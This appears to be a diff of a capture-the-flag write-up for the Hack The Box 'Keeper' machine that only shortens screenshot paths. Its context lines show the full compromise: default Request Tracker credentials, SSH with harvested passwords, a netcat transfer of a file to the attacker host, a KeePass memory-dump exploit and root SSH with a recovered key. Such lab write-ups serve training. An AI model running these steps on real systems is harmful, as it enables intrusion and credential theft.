@@ -47,7 +47,7 @@ First, we verify that the host is reachable:
 ping -c 1 10.10.11.227
 ```
 
-![ping](cases/HackTheBox/Machines/EASY/Keeper/screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 ---
 ### 1.2 Port Scanning
@@ -61,7 +61,7 @@ We scan all TCP ports with Nmap to identify services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.227 -oG allPorts
 ```
 
-![allports](cases/HackTheBox/Machines/EASY/Keeper/screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -69,7 +69,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![extractports](cases/HackTheBox/Machines/EASY/Keeper/screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -83,16 +83,16 @@ We run a detailed scan on discovered ports:
 nmap -sCV -p22,80 10.10.11.227 -oN targeted
 ```
 
-![targeted](cases/HackTheBox/Machines/EASY/Keeper/screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 **Findings:**  
 - **SSH** â†’ OpenSSH 8.9p1 Ubuntu 3ubuntu0.3  
 
-![launchpad_openssh](cases/HackTheBox/Machines/EASY/Keeper/screenshots/launchpad_openssh.png)
+![launchpad_openssh](screenshots/launchpad_openssh.png)
 
 - **HTTP** â†’ nginx 1.18.0
 
-![launchpad_nginx](cases/HackTheBox/Machines/EASY/Keeper/screenshots/launchpad_nginx.png)
+![launchpad_nginx](screenshots/launchpad_nginx.png)
 
 Note: The `Uploaded To` field in banners hints that one service could be containerized (possibly Docker), but this detail does not directly affect exploitation.
 
@@ -103,11 +103,11 @@ Note: The `Uploaded To` field in banners hints that one service could be contain
 
 Visiting the IP shows a placeholder page:  
 
-![web](cases/HackTheBox/Machines/EASY/Keeper/screenshots/web.png)
+![web](screenshots/web.png)
 
 Clicking the message displays an error implying the hostname must be in `/etc/hosts`:  
 
-![web_not_in_etc_hosts](cases/HackTheBox/Machines/EASY/Keeper/screenshots/web_not_in_etc_hosts.png)
+![web_not_in_etc_hosts](screenshots/web_not_in_etc_hosts.png)
 
 We add:
 
@@ -117,14 +117,14 @@ We add:
 
 Now, the site loads a login page:  
 
-![web_in_etc_hosts](cases/HackTheBox/Machines/EASY/Keeper/screenshots/web_in_etc_hosts.png)
+![web_in_etc_hosts](screenshots/web_in_etc_hosts.png)
 
 ---
 ### 2.2 Identifying Request Tracker
 
 We see â€œRequest Trackerâ€ branding:  
 
-![request_tracker](cases/HackTheBox/Machines/EASY/Keeper/screenshots/request_tracker.png)
+![request_tracker](screenshots/request_tracker.png)
 
 Searching for it on Google reveals the GitHub repository:  
 [https://github.com/bestpractical/rt](https://github.com/bestpractical/rt)
@@ -146,7 +146,7 @@ Username: root
 Password: password
 ```
 
-![web_login](cases/HackTheBox/Machines/EASY/Keeper/screenshots/web_login.png)
+![web_login](screenshots/web_login.png)
 
 Access granted.
 
@@ -155,9 +155,9 @@ Access granted.
 
 Inside `Admin â†’ Users`, we locate another user:  
 
-![web_admin_users_section](cases/HackTheBox/Machines/EASY/Keeper/screenshots/web_admin_users_section.png)
+![web_admin_users_section](screenshots/web_admin_users_section.png)
 
-![web_lnorgaard](cases/HackTheBox/Machines/EASY/Keeper/screenshots/web_lnorgaard.png)
+![web_lnorgaard](screenshots/web_lnorgaard.png)
 
 Credentials found:
 
@@ -177,7 +177,7 @@ We connect via SSH:
 ssh lnorgaard@10.10.11.227
 ```
 
-![ssh_lnorgaard](cases/HackTheBox/Machines/EASY/Keeper/screenshots/ssh_lnorgaard.png)
+![ssh_lnorgaard](screenshots/ssh_lnorgaard.png)
 
 ðŸ **User flag obtained**.
 
@@ -194,7 +194,7 @@ lsb_release -a
 ls -l
 ```
 
-![ssh_lnorgaard_info](cases/HackTheBox/Machines/EASY/Keeper/screenshots/ssh_lnorgaard_info.png)
+![ssh_lnorgaard_info](screenshots/ssh_lnorgaard_info.png)
 
 This is an Ubuntu Jammy system.
 
@@ -213,7 +213,7 @@ nc -nlvp 443 > file.zip
 nc 10.10.14.7 443 < RT30000.zip
 ```
 
-![download_zip_file](cases/HackTheBox/Machines/EASY/Keeper/screenshots/download_zip_file.png)
+![download_zip_file](screenshots/download_zip_file.png)
 
 Verify integrity:
 
@@ -221,26 +221,26 @@ Verify integrity:
 md5sum file.zip
 ```
 
-![zip_file_hash](cases/HackTheBox/Machines/EASY/Keeper/screenshots/zip_file_hash.png)
+![zip_file_hash](screenshots/zip_file_hash.png)
 
 ---
 ### 4.3 KeePass Database Analysis
 
 Unzipping reveals `passcodes.kdbx`:  
 
-![read_files_in_zip_file](cases/HackTheBox/Machines/EASY/Keeper/screenshots/read_files_in_zip_file.png)
-![unzip_zip_file](cases/HackTheBox/Machines/EASY/Keeper/screenshots/unzip_zip_file.png)
+![read_files_in_zip_file](screenshots/read_files_in_zip_file.png)
+![unzip_zip_file](screenshots/unzip_zip_file.png)
 
 Opening with KeePassXC requires a master password:  
 ```bash
 keepassxc passcodes.kdbx
 ```
 
-![keepass_app](cases/HackTheBox/Machines/EASY/Keeper/screenshots/keepass_app.png)
+![keepass_app](screenshots/keepass_app.png)
 
 We dump its hash:  
 
-![keepass2john_kdbx](cases/HackTheBox/Machines/EASY/Keeper/screenshots/keepass2john_kdbx.png)
+![keepass2john_kdbx](screenshots/keepass2john_kdbx.png)
 
 The hash is not crackable with standard wordlists.
 
@@ -257,11 +257,11 @@ wget https://raw.githubusercontent.com/matro7sh/keepass-dump-masterkey/refs/head
 python3 poc.py KeePassDumpFull.dmp
 ```
 
-![wget_poc_py](cases/HackTheBox/Machines/EASY/Keeper/screenshots/wget_poc_py.png)
+![wget_poc_py](screenshots/wget_poc_py.png)
 
 Output contains special characters. Searching reveals itâ€™s Danish: `RÃ¸dgrÃ¸d med FlÃ¸de`.
 
-![password_search](cases/HackTheBox/Machines/EASY/Keeper/screenshots/password_search.png)
+![password_search](screenshots/password_search.png)
 
 ---
 ### 4.5 Unlocking KeePass
@@ -273,7 +273,7 @@ rÃ¸dgrÃ¸d med flÃ¸de
 
 Inside KeePass, we find two entries. The `root` entry contains a **PuTTY-User-Key-File**:  
 
-![keepass_password_saved](cases/HackTheBox/Machines/EASY/Keeper/screenshots/keepass_password_saved.png)
+![keepass_password_saved](screenshots/keepass_password_saved.png)
 
 ### 4.6 Direct root login does not work
 
@@ -284,10 +284,10 @@ ssh root@10.10.11.227
 ```
 
 - SSH login as `root` using a password â†’ rejected.  
-    ![ssh_root](cases/HackTheBox/Machines/EASY/Keeper/screenshots/ssh_root.png)
+    ![ssh_root](screenshots/ssh_root.png)
 
 - From the compromised user, trying to elevate locally (e.g., `sudo`/`su`) also fails.  
-    ![lnorgaard_ssh](cases/HackTheBox/Machines/EASY/Keeper/screenshots/lnorgaard_ssh.png)
+    ![lnorgaard_ssh](screenshots/lnorgaard_ssh.png)
 
 This confirms we must leverage the material found in KeePass.
 
@@ -301,9 +301,9 @@ The `root` entry in KeePass includes a **PuTTY-User-Key-File**. We save its cont
 puttygen private_key -O private-openssh -o id_rsa 
 ```
 
-![private_key](cases/HackTheBox/Machines/EASY/Keeper/screenshots/private_key.png)
+![private_key](screenshots/private_key.png)
 
-![id_rsa](cases/HackTheBox/Machines/EASY/Keeper/screenshots/id_rsa.png)
+![id_rsa](screenshots/id_rsa.png)
 
 ---
 
@@ -316,7 +316,7 @@ chmod 600 id_rsa
 ssh -i id_rsa root@10.10.11.227
 ```
 
-![root_flag](cases/HackTheBox/Machines/EASY/Keeper/screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ðŸ **Root flag obtained**
 
